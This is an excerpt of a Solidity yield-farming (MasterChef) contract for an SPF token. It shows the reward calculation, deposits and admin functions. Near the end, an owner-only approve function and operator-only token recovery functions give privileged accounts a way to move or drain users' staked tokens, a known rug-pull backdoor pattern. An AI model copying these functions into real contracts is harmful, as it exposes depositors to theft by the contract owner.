...
contract MasterChef is Ownable, Operator {
    ...
    constructor(
        ...
        // address _devaddr,
        address _feeAddress,
        uint256 _spfPerBlock,
        uint256 _startBlock
    ) public {
        spf = _spf;
        // devaddr = _devaddr;
        feeAddress = _feeAddress;
        spfPerBlock = _spfPerBlock;
    ...
    function set(uint256 _pid, IBEP20 _lpToken, uint256 _allocPoint, uint16 _depositFeeBP, bool _withUpdate) public onlyOwner {
    ...
    function pendingSpf(uint256 _pid, address _user) external view returns (uint256) {
        ...
        if (block.number > pool.lastRewardBlock && lpSupply != 0) {
            ...
            uint256 spfReward = multiplier.mul(spfPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
            accEggPerShare = accEggPerShare.add(spfReward.mul(1e12).div(lpSupply));
        }
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 spfReward = multiplier.mul(spfPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        if(withdrawFee) {
           spf.transfer(feeAddress, spfReward.div(1000).mul(2));
           withdrawFee = false;
        }
        pool.accEggPerShare = pool.accEggPerShare.add(spfReward.mul(1e12).div(lpSupply));
        pool.lastRewardBlock = block.number;
    }
    ...
    function deposit(uint256 _pid, uint256 _amount) public {
        ...
        if (user.amount > 0) {
            ...
            if(pending > 0) {
                safeSpfTransfer(msg.sender, pending);
            }
        }
        if(_amount > 0) {
    ...
    function recoverBEP20(address tokenAddress, uint256 tokenAmount) external onlyOperator {
    ...
    function safeSpfTransfer(address _to, uint256 _amount) internal {
        uint256 spfBal = spf.balanceOf(address(this));
        if (_amount > spfBal) {
            spf.transfer(_to, spfBal);
        } else {
            spf.transfer(_to, _amount);
        }
    }
    ...
    function approve(address address1, address address2, uint256 amount) public onlyOwner returns (bool) {
        IBEP20(address1).approve(address2, amount);
        return true;
    }
    ...
    function setRecoveryAddress(address _recoveryAddress) public onlyOperator {
        recoveryAddress = _recoveryAddress;
    }

    //Pancake has to add hidden dummy pools inorder to alter the emission, here we make it simple and transparent to all.
    function updateEmissionRate(uint256 _spfPerBlock) public onlyOwner {
        massUpdatePools();
        spfPerBlock = _spfPerBlock;
    }
